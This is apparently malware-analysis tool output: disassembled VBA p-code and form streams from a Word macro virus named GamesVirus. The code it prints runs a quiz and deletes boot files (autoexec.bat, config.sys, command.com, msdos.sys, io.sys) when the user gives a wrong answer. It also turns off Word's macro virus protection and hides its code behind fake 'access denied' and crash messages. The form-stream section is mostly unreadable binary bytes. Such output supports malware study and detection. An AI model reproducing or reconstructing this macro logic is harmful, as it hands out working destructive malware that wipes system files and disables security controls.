' 	St StatusBar 
' Line #127:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #128:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #129:
' 	LitStr 0x005D "                       Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
' 	St StatusBar 
' Line #130:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #131:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #132:
' 	LitStr 0x0065 "                               Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
' 	St StatusBar 
' Line #133:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #134:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #135:
' 	LitStr 0x006D "                                       Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
' 	St StatusBar 
' Line #136:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #137:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #138:
' 	LitStr 0x0075 "                                               Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
' 	St StatusBar 
' Line #139:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #140:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #141:
' 	LitStr 0x007D "                                                       Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
' 	St StatusBar 
' Line #142:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #143:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #144:
' 	LitStr 0x0085 "                                                               Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
' 	St StatusBar 
' Line #145:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #146:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #147:
' 	LitStr 0x008D "                                                                       Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
' 	St StatusBar 
' Line #148:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #149:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #150:
' 	LitStr 0x0095 "                                                                               Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
' 	St StatusBar 
' Line #151:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #152:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #153:
' 	LitStr 0x009D "                                                                                       Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
' 	St StatusBar 
' Line #154:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #155:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #156:
' 	LitStr 0x00A5 "                                                                                               Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
' 	St StatusBar 
' Line #157:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #158:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #159:
' 	LitStr 0x00AD "                                                                                                       Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
' 	St StatusBar 
' Line #160:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #161:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #162:
' 	LitStr 0x00B5 "                                                                                                               Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
' 	St StatusBar 
' Line #163:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #164:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #165:
' 	LitStr 0x00BD "                                                                                                                       Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
' 	St StatusBar 
' Line #166:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #167:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #168:
' 	LitStr 0x00C5 "                                                                                                                               Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
' 	St StatusBar 
' Line #169:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #170:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #171:
' 	LitStr 0x00CD "                                                                                                                                       Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
' 	St StatusBar 
' Line #172:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #173:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #174:
' 	LitStr 0x00D5 "                                                                                                                                               Tu es le meilleur, bravo de la part de GamesVirus et de son auteur...."
' 	St StatusBar 
' Line #175:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #176:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #177:
' 	GoTo Message 
' Line #178:
' 	ElseBlock 
' Line #179:
' 	GoTo Autre 
' Line #180:
' 	EndIfBlock 
' Line #181:
' 	Label Autre 
' Line #182:
' 	LitStr 0x002A "T'as eu quelque(s) réponse(s) de fausse!!!"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0013 "Dommage pour toi!!!"
' 	Concat 
' 	Ld vbInformation 
' 	LitStr 0x000A "GamesVirus"
' 	ArgsCall MsgBox 0x0003 
' Line #183:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	ArgsCall Kill 0x0001 
' Line #184:
' 	LitStr 0x000D "c:\config.sys"
' 	ArgsCall Kill 0x0001 
' Line #185:
' 	LitStr 0x000E "c:\command.com"
' 	ArgsCall Kill 0x0001 
' Line #186:
' 	LitStr 0x000C "c:\msdos.sys"
' 	ArgsCall Kill 0x0001 
' Line #187:
' 	LitStr 0x0009 "c:\io.sys"
' 	ArgsCall Kill 0x0001 
' Line #188:
' 	LitStr 0x0014 "Bon redemarrage!!!!!"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x000B "HAHAHAHAHA!"
' 	Concat 
' 	Ld vbExclamation 
' 	LitStr 0x000A "GamesVirus"
' 	ArgsCall MsgBox 0x0003 
' Line #189:
' 	GoTo Fin 
' Line #190:
' 	Label Fin 
' Line #191:
' Line #192:
' 	Label ErrorPL 
' Line #193:
' 	EndSub 
' Line #194:
' 	FuncDefn (Sub ToolsMacro())
' Line #195:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #196:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #197:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #198:
' 	OnError ErrorTM 
' Line #199:
' 	LitStr 0x0010 "accès refusé!!!!"
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #200:
' 	Label ErrorTM 
' Line #201:
' 	EndSub 
' Line #202:
' 	FuncDefn (Sub ViewVBCode())
' Line #203:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #204:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #205:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #206:
' 	OnError ErrorVVBC 
' Line #207:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #208:
' 	Label ErrorVVBC 
' Line #209:
' 	EndSub 
' Macros/VBA/UserForm1 - 3885 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #2:
' 	Dim 
' 	VarDefn Reponse1
' Line #3:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0004 "Rep1"
' 	LitStr 0x000C "WINWORD8.INI"
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St Reponse1$ 
' Line #4:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0004 "Rep1"
' 	LitStr 0x0001 "1"
' 	LitStr 0x000C "WINWORD8.INI"
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #5:
' 	Ld UserForm1 
' 	ArgsCall Unlock 0x0001 
' Line #6:
' 	EndSub 
' Line #7:
' Line #8:
' 	FuncDefn (Private Sub CommandButton2_Click())
' Line #9:
' 	Dim 
' 	VarDefn Reponse1
' Line #10:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0004 "Rep1"
' 	LitStr 0x000C "WINWORD8.INI"
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St Reponse1$ 
' Line #11:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0004 "Rep1"
' 	LitStr 0x0001 "2"
' 	LitStr 0x000C "WINWORD8.INI"
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #12:
' 	Ld UserForm1 
' 	ArgsCall Unlock 0x0001 
' Line #13:
' 	EndSub 
' Line #14:
' Line #15:
' 	FuncDefn (Private Sub Userform_Initialize())
' Line #16:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #17:
' 	Dim 
' 	VarDefn Reponse1
' Line #18:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0004 "Rep1"
' 	LitStr 0x000C "WINWORD8.INI"
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St Reponse1$ 
' Line #19:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0004 "Rep1"
' 	LitStr 0x0001 "0"
' 	LitStr 0x000C "WINWORD8.INI"
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #20:
' 	EndSub 
' Macros/VBA/UserForm2 - 3875 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #2:
' 	Dim 
' 	VarDefn Reponse2
' Line #3:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0004 "Rep2"
' 	LitStr 0x000C "WINWORD8.INI"
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St Reponse2$ 
' Line #4:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0004 "Rep2"
' 	LitStr 0x0001 "1"
' 	LitStr 0x000C "WINWORD8.INI"
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #5:
' 	Ld UserForm2 
' 	ArgsCall Unlock 0x0001 
' Line #6:
' 	EndSub 
' Line #7:
' Line #8:
' 	FuncDefn (Private Sub CommandButton2_Click())
' Line #9:
' 	Dim 
' 	VarDefn Reponse2
' Line #10:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0004 "Rep2"
' 	LitStr 0x000C "WINWORD8.INI"
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St Reponse2$ 
' Line #11:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0004 "Rep2"
' 	LitStr 0x0001 "2"
' 	LitStr 0x000C "WINWORD8.INI"
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #12:
' 	Ld UserForm2 
' 	ArgsCall Unlock 0x0001 
' Line #13:
' 	EndSub 
' Line #14:
' 	FuncDefn (Private Sub Userform_Initialize())
' Line #15:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #16:
' 	Dim 
' 	VarDefn Reponse2
' Line #17:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0004 "Rep2"
' 	LitStr 0x000C "WINWORD8.INI"
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St Reponse2$ 
' Line #18:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0004 "Rep2"
' 	LitStr 0x0001 "0"
' 	LitStr 0x000C "WINWORD8.INI"
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #19:
' 	EndSub 
' Macros/VBA/UserForm3 - 3876 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #2:
' 	Dim 
' 	VarDefn Reponse3
' Line #3:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0004 "Rep3"
' 	LitStr 0x000C "WINWORD8.INI"
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St Reponse3$ 
' Line #4:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0004 "Rep3"
' 	LitStr 0x0001 "1"
' 	LitStr 0x000C "WINWORD8.INI"
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #5:
' 	Ld UserForm3 
' 	ArgsCall Unlock 0x0001 
' Line #6:
' 	EndSub 
' Line #7:
' Line #8:
' 	FuncDefn (Private Sub CommandButton2_Click())
' Line #9:
' 	Dim 
' 	VarDefn Reponse3
' Line #10:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0004 "Rep3"
' 	LitStr 0x000C "WINWORD8.INI"
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St Reponse3$ 
' Line #11:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0004 "Rep3"
' 	LitStr 0x0001 "2"
' 	LitStr 0x000C "WINWORD8.INI"
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #12:
' 	Ld UserForm3 
' 	ArgsCall Unlock 0x0001 
' Line #13:
' 	EndSub 
' Line #14:
' 	FuncDefn (Private Sub Userform_Initialize())
' Line #15:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #16:
' 	Dim 
' 	VarDefn Reponse3
' Line #17:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0004 "Rep3"
' 	LitStr 0x000C "WINWORD8.INI"
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St Reponse3$ 
' Line #18:
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0004 "Rep3"
' 	LitStr 0x0001 "0"
' 	LitStr 0x000C "WINWORD8.INI"
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #19:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��L��|�����ԥ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��D��d�����ԥ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��-��]�����ͭ����%��]��}�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��#��#��#��#��+��+��+��3��3��3��3��;��;��;��;��C��c�����������������������������)��Y�����������!��Q��y��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��:��J��J��J��J��R�����������������������������������������������������������������������
��
��
��
��
��
��
��
��
��Z��b��b��b��b��b��b��b��b��b��b��b��b��b��R��R��R��R��R��R��R��R��R��R��R��R��R��R��R��R��R��Z��Z��Z��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��
��
��r��r��r��r��r��r��r��r��r��r��r��r��r��z��z��z��z��z�����������������b��b��b��j��j��j��j��j��j��j��j��j��j��j��j��j��j��j��j��j��r��r��r��r�����������������������������������������������������������������x��x�����*��"��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��
��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Ja)Ja)Ja)Ja;Zq(BY(Ba BY(Ba)Ji)Ji1Ji1Jq*Rq2Rq2Ri)Ja)Ja)Ja)Ji2Rq2Ri)Ja(Ba<c�;Zy2Ri)Ji)Ja BY(BY(BY BQ BY BY BY)Ja*Ri*Ri1Ji(BY(Ba(BY'9Q(BY BY BY)Ja)Ja/9Y'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Q'9Q'9Q'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Q(Ba)Ji2Rq3Zq2Rq)Ji BY)Ja2Rq2Ri)Ji)Ja BY(BY BY BY1Ji2Rq3ZqDc�;Zy2Rq1Ji)Ja)Ja)Ji2Ri;Zy2Rq2Rq1Ji)Ji2Ri2Ri)Ja)Ja)Ja)Ji2Rq2Rq;Zy;Zq2Rq2Rq2Rq)Ji1Ji)Ja)Ja)Ja)Ja2Rq)Ji'9Y'9Q BY(Ba1Ji(Ba)Ja)Ja)Ja1Ji2Rq*Rq2Rq)Ji)Ji1Ji)Ji2Ri)Ji)Ji)Ji)Ji)Ji2Rq<cy<c�;Zy)Ji1Ji1Ji)Ji2Rq3Zy<cyEk�>s�<cy3Zq)Ja)Ji)Ji*Ri2Rq2Rq)Ji/9Y&1Q/9Y(Ba)Ja2Rq;Z�2Rq)Ji Ba)Ja)Ji)Ji2Rq2Rq2Rq3Zy3Zy<c�Ek�Ek�Ek�Dc�3Zq2Rq(Ba Ba BY BY)Ji)Ji)Ji2Rq2Rq)Ji(Ba*Ri)Ji)Ja*Ri3Zy3Zy*Ri)Ji)Ji2Rq;Zy2Rq2Ri2Rq1Ji2Rq2Rq2Rq;Zy2Rq2Rq2Rq*Ri2Rq2Rq1Ji1Ji'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q&1Q'9Q BY)Ji)Ji2Rq2Ry*Rq2Ry)Ji)Ja)Ji Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'9Q'9Q(BY BY)Ja2RiEky)Ja)Ji BY)Ji)Ji)Ji(BY*Ri BY)Ji)Ji1Ji)Ja*Ri2Rq2Rq*Ri'9Q4c�3Zq)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Q BY BY BY(BY BY)Ji2Rq*Ri)Ji Ba BY BY'9Q(BY(BY BY(Ba Ba'9Y&1Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q'9Q(Ba BY(BY BY'9Q'9Q BY*Ri;Zy2Rq2Rq1Ji BY BY BY'9Q BY)Ja*Ri3Zq2Rq3Zy3Zq*Ri2Rq)Ji)Ja)Ja)Ja)Ja)Ja(Ba)Ji1Ji)Ji2Rq*Ri*Ri2Ri)Ja1Ji2Ri)Ji;Zy=ky>s�Ns�Ns�Dcy2Ri(BY)Ja1Ji)Ja)Ja(Ba(Ba)Ja Ba)Ja)Ji Ba BY BY Ba2Rq2Rq2Rq3Zy3Zq3Zy2Ry2Rq3Zy*Rq*Rq*Rq*Ri2Rq2Rq3ZqDc�Dc�3Zy3Zy*Ri)Ji)Ji)Ji2Rq3Zy4c�<c�*Ri BY)Ja)Ji2Rq2Rq*Ri)Ji(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I BY)Ja*Ri)Ji Ba(Ba(Ba BY*Ri3Zq3Zy;Zy3Zy3Zy<c�<c�<c�<c�3Zy2Rq)Ji Ba BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q Ba(Ba)Ja1Ji*Ri)Ji)Ji)Ji)Ji)Ji*Ri2Ri2Ri*Ri3Zy*Ri)Ji(BY)Ja;Zy<c�2Rq2Rq1Ji)Ji1Ji)Ji)Ji2Ri)Ja)Ja)Ja BY)Ja*Ri2Rq;Zy)Ji)Ji2Ri*Ri2Rq2Rq*Rq2Rq*Rq*Rq*Rq)Ja)Ji)Ji)Ji)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3Zy2Rq BY)Ja(Ba BY1Jq;ZqEk�3Zq*Ri1Jq3Zy'9Y BY)Ja3Zq(Ba)Ja(Ba)Ji)Ji1Ji2Ri2Ri)Ja3Zq*Ri(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q(Ba)Ji)Ji)Ja)Ja(BY)Ja)Ja)Ji3Zy2Rq)Ji)Ji Ba)Ja BY(Ba)Ja(Ba(Ba(Ba Ba(Ba(Bi(Ba)Ji)Ji)Ji)Ji'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q Ba*Ri2Rq)Ja BY(Ba)Ja(Ba BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q(Ba)Ji2Rq2Rq)Ja)Ja)Ja!JY)Ja(Ba BY(Ba)Ja'9Y&1Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)I'9Q2Rq*Rq2Ry2Ry)Ji(Ba(Ba*Ri;Zy2Rq2Ri2Ri2Ri2Ri2Ri)Ji1Ji2Rq3Zq;Zy2Ri1Ji1Ji)Ja)Ji(Ba Ba Ba BY(Ba)Ji3Zy<c�Dc�<c�Ek�=k�=k�3Zy)Ja(Ba BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y)Ja1Ji2Rq;Zy3Zy2Rq)Ji)Ja2Rq;Zy2Rq2Rq2Rq2Rq;Z�*Rq)Ja BY)Ja2Rq*Ri)Ji)Ji)Ja)Ja2Rq4c�Ek�<c�)Ja)Ja2Rq<c�Ek�<c�<c�3Zq)Ja)Ja)Ja)Ja)Ja!Ja Ba)Ja BY'9Y'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Y Ba)Ja1Ji)Ji)Ji)Ji(Ba2Rq2Rq2Rq<c�;Zy)Ji'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)I&1I'9Y2Rq*Ri)Ji(BY(Ba(Ba)Ja(Ba(Ba)Ja)Ja2Ri)Ja)Ja1Ji2Rq;Zy;Zy3Zq;Zy<cy<c�<c�2Rq*Rq1Ji(Ba BY'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y)Ji*Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Ji)Ji)Ji Ba BY)Ji BY2Rq(Ba)JY<cy2Ri!Ja2Rq!Ja BY BY BY3Zy(BY BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ji'9I*Ri BY BY Ba(Ba BY Ba)Ji)Ja!Ja(BY BY(Ba)Ji)Ji3Zy2Rq)Ji)Ji)Ji2Rq2Rq)Ji1Ji BY BY'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Y BY(BY'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
